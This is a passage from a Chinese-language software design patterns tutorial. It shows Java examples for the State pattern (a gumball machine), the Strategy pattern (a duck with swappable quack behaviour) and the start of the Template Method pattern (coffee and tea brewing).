class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You can't insert another quarter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Quarter returned"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>gumballMachine<span class="token punctuation">.</span><span class="token function">getNoQuarterState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You turned..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>gumballMachine<span class="token punctuation">.</span><span class="token function">getSoldState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dispense</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No gumball dispensed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NoQuarterState</span> <span class="token keyword">implements</span> <span class="token class-name">State</span> <span class="token punctuation">{</span>    GumballMachine gumballMachine<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">NoQuarterState</span><span class="token punctuation">(</span>GumballMachine gumballMachine<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>gumballMachine <span class="token operator">=</span> gumballMachine<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You insert a quarter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>gumballMachine<span class="token punctuation">.</span><span class="token function">getHasQuarterState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You haven't insert a quarter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You turned, but there's no quarter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dispense</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You need to pay first"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SoldOutState</span> <span class="token keyword">implements</span> <span class="token class-name">State</span> <span class="token punctuation">{</span>    GumballMachine gumballMachine<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SoldOutState</span><span class="token punctuation">(</span>GumballMachine gumballMachine<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>gumballMachine <span class="token operator">=</span> gumballMachine<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You can't insert a quarter, the machine is sold out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You can't eject, you haven't inserted a quarter yet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"You turned, but there are no gumballs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dispense</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"No gumball dispensed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SoldState</span> <span class="token keyword">implements</span> <span class="token class-name">State</span> <span class="token punctuation">{</span>    GumballMachine gumballMachine<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">SoldState</span><span class="token punctuation">(</span>GumballMachine gumballMachine<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>gumballMachine <span class="token operator">=</span> gumballMachine<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Please wait, we're already giving you a gumball"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sorry, you already turned the crank"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Turning twice doesn't get you another gumball!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dispense</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">releaseBall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>gumballMachine<span class="token punctuation">.</span><span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            gumballMachine<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>gumballMachine<span class="token punctuation">.</span><span class="token function">getNoQuarterState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Oops, out of gumballs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            gumballMachine<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>gumballMachine<span class="token punctuation">.</span><span class="token function">getSoldOutState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GumballMachine</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> State soldOutState<span class="token punctuation">;</span>    <span class="token keyword">private</span> State noQuarterState<span class="token punctuation">;</span>    <span class="token keyword">private</span> State hasQuarterState<span class="token punctuation">;</span>    <span class="token keyword">private</span> State soldState<span class="token punctuation">;</span>    <span class="token keyword">private</span> State state<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">GumballMachine</span><span class="token punctuation">(</span><span class="token keyword">int</span> numberGumballs<span class="token punctuation">)</span> <span class="token punctuation">{</span>        count <span class="token operator">=</span> numberGumballs<span class="token punctuation">;</span>        soldOutState <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoldOutState</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        noQuarterState <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NoQuarterState</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hasQuarterState <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasQuarterState</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        soldState <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoldState</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>numberGumballs <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            state <span class="token operator">=</span> noQuarterState<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            state <span class="token operator">=</span> soldOutState<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        state<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        state<span class="token punctuation">.</span><span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        state<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        state<span class="token punctuation">.</span><span class="token function">dispense</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setState</span><span class="token punctuation">(</span>State state<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> state<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">releaseBall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"A gumball comes rolling out the slot..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            count <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> State <span class="token function">getSoldOutState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> soldOutState<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> State <span class="token function">getNoQuarterState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> noQuarterState<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> State <span class="token function">getHasQuarterState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> hasQuarterState<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> State <span class="token function">getSoldState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> soldState<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> count<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        GumballMachine gumballMachine <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GumballMachine</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        gumballMachine<span class="token punctuation">.</span><span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>You insert a quarterYou turned<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>A gumball comes rolling out the slot<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>You insert a quarterQuarter returnedYou turned<span class="token punctuation">,</span> but there's no quarterYou need to pay firstYou insert a quarterYou turned<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>A gumball comes rolling out the slot<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>You insert a quarterYou turned<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>A gumball comes rolling out the slot<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>You haven't insert a quarterYou insert a quarterYou can't insert another quarterYou turned<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>A gumball comes rolling out the slot<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>You insert a quarterYou turned<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>A gumball comes rolling out the slot<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Oops<span class="token punctuation">,</span> out of gumballsYou can't insert a quarter<span class="token punctuation">,</span> the machine is sold outYou turned<span class="token punctuation">,</span> but there are no gumballsNo gumball dispensed</code></pre><h2 id="9-策略（Strategy）"><a href="#9-策略（Strategy）" class="headerlink" title="9. 策略（Strategy）"></a>9. 策略（Strategy）</h2><h3 id="Intent-14"><a href="#Intent-14" class="headerlink" title="Intent"></a>Intent</h3><p>定义一系列算法，封装每个算法，并使它们可以互换。</p><p>策略模式可以让算法独立于使用它的客户端。</p><h3 id="Class-Diagram-14"><a href="#Class-Diagram-14" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Strategy 接口定义了一个算法族，它们都实现了 behavior() 方法。</li><li>Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 behavior()，setStrategy(Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1fc969e4-0e7c-441b-b53c-01950d2f2be5.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1fc969e4-0e7c-441b-b53c-01950d2f2be5.png" alt="img"></a></p><h3 id="与状态模式的比较"><a href="#与状态模式的比较" class="headerlink" title="与状态模式的比较"></a>与状态模式的比较</h3><p>状态模式的类图和策略模式类似，并且都是能够动态改变对象的行为。但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。</p><p>状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。</p><h3 id="Implementation-14"><a href="#Implementation-14" class="headerlink" title="Implementation"></a>Implementation</h3><p>设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">QuackBehavior</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Quack</span> <span class="token keyword">implements</span> <span class="token class-name">QuackBehavior</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"quack!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Squeak</span> <span class="token keyword">implements</span> <span class="token class-name">QuackBehavior</span><span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"squeak!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Duck</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> QuackBehavior quackBehavior<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">performQuack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>quackBehavior <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            quackBehavior<span class="token punctuation">.</span><span class="token function">quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setQuackBehavior</span><span class="token punctuation">(</span>QuackBehavior quackBehavior<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>quackBehavior <span class="token operator">=</span> quackBehavior<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Duck duck <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Duck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        duck<span class="token punctuation">.</span><span class="token function">setQuackBehavior</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Squeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        duck<span class="token punctuation">.</span><span class="token function">performQuack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        duck<span class="token punctuation">.</span><span class="token function">setQuackBehavior</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Quack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        duck<span class="token punctuation">.</span><span class="token function">performQuack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>squeak<span class="token operator">!</span>quack<span class="token operator">!</span></code></pre><h3 id="JDK-12"><a href="#JDK-12" class="headerlink" title="JDK"></a>JDK</h3><ul><li>java.util.Comparator#compare()</li><li>javax.servlet.http.HttpServlet</li><li>javax.servlet.Filter#doFilter()</li></ul><h2 id="10-模板方法（Template-Method）"><a href="#10-模板方法（Template-Method）" class="headerlink" title="10. 模板方法（Template Method）"></a>10. 模板方法（Template Method）</h2><h3 id="Intent-15"><a href="#Intent-15" class="headerlink" title="Intent"></a>Intent</h3><p>定义算法框架，并将一些步骤的实现延迟到子类。</p><p>通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。</p><h3 id="Class-Diagram-15"><a href="#Class-Diagram-15" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c3c1c0e8-3a78-4426-961f-b46dd0879dd8.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c3c1c0e8-3a78-4426-961f-b46dd0879dd8.png" alt="img"></a></p><h3 id="Implementation-15"><a href="#Implementation-15" class="headerlink" title="Implementation"></a>Implementation</h3><p>冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/11236498-1417-46ce-a1b0-e10054256955.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/11236498-1417-46ce-a1b0-e10054256955.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">CaffeineBeverage</span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">prepareRecipe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">boilWater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">brew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">pourInCup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">addCondiments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">brew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">addCondiments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">boilWater</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"boilWater"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">pourInCup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"pourInCup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Coffee</span> <span class="token keyword">extends</span> <span class="token class-name">CaffeineBeverage</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">void</span> <span class="token function">brew</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token 